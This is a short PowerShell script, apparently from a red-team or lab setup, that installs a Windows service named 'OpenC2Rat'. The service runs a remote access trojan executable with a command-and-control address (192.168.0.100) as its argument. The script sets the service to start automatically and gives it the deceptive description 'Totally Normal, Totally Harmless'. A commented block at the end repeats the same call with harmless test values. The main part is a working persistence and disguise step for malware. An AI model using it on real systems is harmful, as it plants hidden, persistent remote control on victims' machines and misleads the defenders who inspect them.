param(
    [Parameter(Mandatory = $false)]
    [string]$Name,
    [Parameter(Mandatory = $false)]
    [string]$Path,
    [Parameter(Mandatory = $false)]
    [string]$Description,
    [Parameter(Mandatory = $false)]
    [string]$C2
)
$Name = 'OpenC2Rat'
$C2 = '192.168.0.100'
$Path = "C:\Users\administrator\Desktop\netcoreapp3.1\OpenC2Rat.exe $C2"
$Description = "Totally Normal, Totally Harmless"


New-Service -Name "$Name" -BinaryPathName "$Path" -Description "$Description" -StartupType Automatic
Start-Service $Name


# Same with but with a hashtable
# $params = @{
#     Name = "TestService"
#     BinaryPathName = '"C:\WINDOWS\System32\svchost.exe -k netsvcs"'
#     DependsOn = "NetLogon"
#     DisplayName = "Test Service"
#     StartupType = "Manual"
#     Description = "This is a test service."
#   }
#   New-Service @params